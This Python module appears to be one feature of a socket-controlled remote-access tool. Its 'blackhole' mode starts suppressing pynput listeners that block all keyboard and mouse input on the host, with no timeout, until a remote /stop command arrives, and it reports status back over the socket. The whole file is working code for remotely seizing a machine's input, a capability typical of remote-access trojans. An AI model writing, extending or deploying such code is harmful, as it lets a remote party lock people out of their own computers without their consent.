"""
Blackhole feature - Complete input suppression
"""

import socket
import threading
from utils.protocol import send_text, send_error
from utils.modes import Mode, ModeManager
from utils.common import log


def start_blackhole(sock: socket.socket, mode_manager: ModeManager) -> None:
    """
    Start blackhole mode - suppress all keyboard and mouse input.
    No automatic timeout. Manual /stop required.

    Args:
        sock: Socket to send confirmation through
        mode_manager: Mode manager instance
    """
    # Check if we can enter blackhole mode
    if not mode_manager.set_mode(Mode.BLACKHOLE):
        send_error(sock, "Already in another mode. Use /stop first.", mode_manager.socket_write_lock)
        return

    try:
        from pynput import keyboard, mouse
    except ImportError:
        send_error(
            sock, "pynput library not available. Install with: pip install pynput", mode_manager.socket_write_lock
        )
        mode_manager.reset_mode()
        return

    # Send confirmation
    send_text(
        sock,
        "[BLACKHOLE ACTIVATED: All keyboard and mouse input blocked. Use /stop to disable.]\n",
        mode_manager.socket_write_lock,
    )
    log("Blackhole mode started - input suppression active")

    # Start blackhole in background thread
    def blackhole_worker():
        """Worker function that suppresses all input"""

        try:
            # Create suppressing listeners
            kbd_listener = keyboard.Listener(suppress=True)
            mouse_listener = mouse.Listener(suppress=True)

            # Store references in mode_manager for external cleanup
            mode_manager.blackhole_listeners = {"keyboard": kbd_listener, "mouse": mouse_listener}

            # Start listeners
            kbd_listener.start()
            mouse_listener.start()

            log("Blackhole: Keyboard and mouse listeners started")

            # Wait for stop signal
            while not mode_manager.is_stopping():
                threading.Event().wait(0.1)  # Sleep in small increments

            # Stop listeners
            kbd_listener.stop()
            mouse_listener.stop()

            log("Blackhole: Listeners stopped")

        except Exception as e:
            log(f"Blackhole worker error: {e}")

        log("Blackhole thread stopped")

    # Start worker thread
    mode_manager.active_thread = threading.Thread(target=blackhole_worker, daemon=True)
    mode_manager.active_thread.start()


def stop_blackhole(sock: socket.socket, mode_manager: ModeManager) -> None:
    """
    Stop blackhole mode and restore input.

    Args:
        sock: Socket to send confirmation through
        mode_manager: Mode manager instance
    """
    if mode_manager.current_mode != Mode.BLACKHOLE:
        send_error(sock, "Blackhole is not running.", mode_manager.socket_write_lock)
        return

    # Explicitly stop listeners before signaling thread
    if hasattr(mode_manager, "blackhole_listeners"):
        for listener in mode_manager.blackhole_listeners.values():
            if listener:
                try:
                    listener.stop()
                except Exception:
                    pass
        delattr(mode_manager, "blackhole_listeners")

    # Signal stop
    mode_manager.signal_stop()

    # Wait for thread to finish
    mode_manager.wait_for_thread(timeout=2)

    # Send confirmation
    send_text(sock, "[BLACKHOLE DEACTIVATED: Input restored.]\n", mode_manager.socket_write_lock)
    log("Blackhole mode stopped - input restored")

    # Reset mode
    mode_manager.reset_mode()
